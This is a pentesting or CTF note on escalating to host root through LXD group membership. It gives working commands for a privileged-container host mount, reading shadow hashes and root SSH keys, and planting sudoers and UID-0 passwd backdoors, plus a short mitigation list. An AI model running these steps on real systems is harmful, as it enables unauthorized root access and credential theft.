# Linux Privilege Escalation – LXD (Linux Containers)

## Overview

Containers provide **OS-level virtualization**, allowing multiple isolated environments to run on the same host kernel.

Unlike virtual machines:

| Feature | Containers | Virtual Machines |
|--------|------------|------------------|
| Kernel | Shared with host | Separate kernel |
| Resource usage | Low | Higher |
| Startup time | Fast | Slower |
| Isolation level | Process-level | Hardware-level |
| Typical tools | Docker, LXC, LXD | VMware, VirtualBox |

Containers are widely used in:

- DevOps pipelines
- microservices architecture
- application sandboxing
- cloud environments
- CI/CD workflows

However, misconfigured container permissions can allow attackers to escape isolation and gain **root access on the host system**.

---

# LXC vs LXD

## LXC (Linux Containers)

Provides OS-level virtualization:

- isolates processes
- shares host kernel
- lightweight
- fast deployment
- commonly used for development environments

---

## LXD (Linux Daemon)

LXD extends LXC and acts as a container manager.

LXD containers behave more like full operating systems:

- full filesystem
- network stack
- process isolation
- device mapping support
- storage management

---

# Why LXD Can Lead to Root Access

Members of the **lxd group** can:

- create containers
- configure container privileges
- mount host filesystem
- disable isolation controls

Privileged containers map container root user to host root user.

This effectively grants full control of the host system.

---

# Check Group Membership

```bash
id
```

Example:

```bash
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

If user belongs to:

```text
lxd
lxc
```

Privilege escalation may be possible.

---

# Attack Strategy

Goal:

create privileged container → mount host filesystem → access sensitive files → escalate privileges

---

# Step 1 – Identify Available Container Images

Check for existing templates:

```bash
ls
```

Example:

```bash
ubuntu-template.tar.xz
```

Administrators often store container templates locally.

These frequently:

- lack authentication
- include weak configurations
- contain preinstalled tools
- allow immediate access

---

# Step 2 – Import Container Image

Import image into LXD:

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

Verify image:

```bash
lxc image list
```

Example output:

```text
ALIAS        DESCRIPTION
ubuntutemp   Ubuntu bionic amd64
```

---

# Step 3 – Create Privileged Container

Create container with disabled isolation:

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

Key option:

```bash
security.privileged=true
```

This maps container root user to host root user.

---

# Step 4 – Mount Host Filesystem

Attach host root directory:

```bash
lxc config device add privesc host-root disk \
source=/ \
path=/mnt/root \
recursive=true
```

Host filesystem becomes accessible inside container.

---

# Step 5 – Start Container

```bash
lxc start privesc
```

Execute shell:

```bash
lxc exec privesc /bin/bash
```

---

# Step 6 – Access Host System

Navigate mounted filesystem:

```bash
cd /mnt/root
```

Example structure:

```text
/mnt/root/etc
/mnt/root/root
/mnt/root/home
/mnt/root/var
```

Sensitive targets:

```bash
/mnt/root/etc/shadow
/mnt/root/root/.ssh/id_rsa
/mnt/root/etc/sudoers
```

---

# Post Exploitation Options

## Extract password hashes

```bash
cat /mnt/root/etc/shadow
```

---

## Retrieve SSH keys

```bash
cat /mnt/root/root/.ssh/id_rsa
```

---

## Add new root user

```bash
echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /mnt/root/etc/sudoers
```

---

## Modify passwd file

```bash
echo 'attacker:x:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd
```

---

# Alternative Method – Upload Custom Container Image

If no local image exists:

attacker may upload Alpine image:

```bash
wget https://example.com/alpine.tar.gz
```

Import image:

```bash
lxc image import alpine.tar.gz --alias alpine
```

---

# Why LXD Is Dangerous

Container isolation assumptions:

container root ≠ host root

Privileged containers break this assumption.

Misconfigured environments often allow:

- unrestricted container creation
- unrestricted device mounting
- unrestricted filesystem access

---

# Enumeration Checklist

## Check group membership

```bash
id
```

---

## Check LXD availability

```bash
which lxc
```

---

## List container images

```bash
lxc image list
```

---

## List containers

```bash
lxc list
```

---

## Check LXD configuration

```bash
lxc config show
```

---

# Defensive Mitigation

Prevent LXD privilege escalation:

- restrict membership in lxd group
- enforce least privilege principle
- disable privileged containers
- restrict device mounting
- audit container activity
- remove unused container templates
- apply container security policies
- monitor container creation logs

Check group members:

```bash
getent group lxd
```

Remove users:

```bash
usermod -G
```

---

# Quick LXD PrivEsc Cheatsheet

```bash
id

lxc image list

lxc init image privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/bash

cd /mnt/root/root
```

---

# Key Takeaways

- LXD provides system-level containers
- lxd group membership often equals root access
- privileged containers bypass isolation
- host filesystem can be mounted inside container
- SSH keys and password hashes easily accessible
- container templates frequently insecure
- always enumerate group memberships early
- container security often overlooked

---

# Tags

#linux
#privilege-escalation
#lxd
#containers
#docker
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian